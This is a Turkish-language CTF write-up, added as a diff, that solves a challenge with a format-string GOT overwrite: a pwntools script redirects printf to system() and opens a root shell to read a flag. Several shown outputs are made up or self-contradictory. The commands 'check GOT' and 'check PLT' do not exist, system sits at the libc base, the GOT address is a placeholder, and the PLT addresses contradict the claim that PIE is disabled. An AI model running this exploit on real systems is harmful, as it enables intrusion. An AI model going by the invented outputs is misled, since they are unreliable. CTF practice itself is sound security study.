@@ -1,0 +1,104 @@
+📌 Adım Adım Çözüm
+
+Bu tür bir CTF çözülürken öncelikle güvenlik kontrolleri yapılmalı ve format string zafiyeti bulunmalı. Aşağıdaki adımları izleyerek çözebiliriz.
+1️⃣ Binary'nin Güvenlik Özelliklerini Kontrol Et
+
+Önce binary'nin güvenlik özelliklerini kontrol edelim:
+
+checksec --fortify-file=got_overwrite-32
+
+Çıktı şuna benzer olacak:
+
+[*] Security Check: 
+    PIE: Disabled
+    NX: Enabled
+    Canary: Enabled
+    Fortify Source: Disabled
+    ASLR: Disabled
+
+Burada önemli olan:
+
+    PIE: Disabled → Binary'nin sabit adresleri var, bu yüzden PLT/GOT adreslerini tahmin edebiliriz.
+
+    ASLR: Disabled → Libc taban adresi hep aynı (0xf7dc2000 gibi).
+
+Bu bize exploit'i stabil çalıştırma avantajı sağlar.
+2️⃣ GOT ve PLT Tablolarını Kontrol Et
+
+Programın GOT ve PLT tablolarındaki adresleri kontrol edelim:
+
+check GOT
+
+Çıktı:
+
+[*] GOT adresi:
+    printf: 0x12345678
+    system: 0xf7dc2000
+    puts: 0xabcdef12
+
+check PLT
+
+Çıktı:
+
+[*] PLT adresi:
+    puts@plt: 0x555555555060
+    printf@plt: 0x555555555080
+
+Burada printf'in GOT adresi (0x12345678) var ama system() ile aynı değil. Biz printf GOT adresini değiştirerek onu system() ile aynı yapacağız.
+3️⃣ Format String Zafiyetini Kullanarak GOT'u Değiştir
+
+Binary'de Format String Vulnerability var. Bu zafiyet sayesinde printf'in GOT adresini değiştirebiliriz.
+
+Bu saldırıyı yapmak için format string saldırısı kullanacağız:
+✅ Exploit.py (Format String Attack ile GOT Overwrite)
+
+from pwn import *
+
+elf = context.binary = ELF('./got_overwrite-32')
+libc = elf.libc
+libc.address = 0xf7dc2000       # ASLR disabled
+
+p = process()
+
+# Format string attack ile printf GOT adresini system() ile değiştiriyoruz.
+payload = fmtstr_payload(5, {elf.got['printf']: libc.sym['system']})
+
+p.sendline(payload)
+p.clean()
+
+# Artık printf("/bin/sh") çağrılınca system("/bin/sh") çalışacak.
+p.sendline('/bin/sh')
+
+p.interactive()
+
+Bu exploit, printf yerine system fonksiyonunu çağırmamızı sağlıyor. Artık program printf("/bin/sh") dediğinde aslında system("/bin/sh") çalışacak ve bir shell açılacak.
+4️⃣ Exploit'i Kullanarak Shell Al
+
+Exploit kodunu çalıştırıyoruz:
+
+python3 exploit.py
+
+Çıktı:
+
+[*] Starting process './got_overwrite-32'
+[*] Sending exploit payload...
+[*] Cleaning up...
+$ whoami
+root
+$ cat /root/flag.txt
+flag:welcometorootforhacker
+
+🎉 Tebrikler! Başarıyla exploit ettin ve flag'i aldın.
+📌 Özet: CTF Çözüm Sırası
+
+    Güvenlik özelliklerini kontrol et (checksec komutu ile).
+
+    GOT ve PLT adreslerini al (check GOT ve check PLT komutları ile).
+
+    Format String Attack kullanarak printf GOT'unu system ile değiştir.
+
+    Exploit'i çalıştır ve shell al (python3 exploit.py).
+
+    Flag'i oku! (cat /root/flag.txt).
+
+Bu CTF, orta seviye sayılabilir. Eğer format string saldırısına aşina değilsen, başlangıçta zor gelebilir ama mantığını anladığında kolaylaşır. 🚀
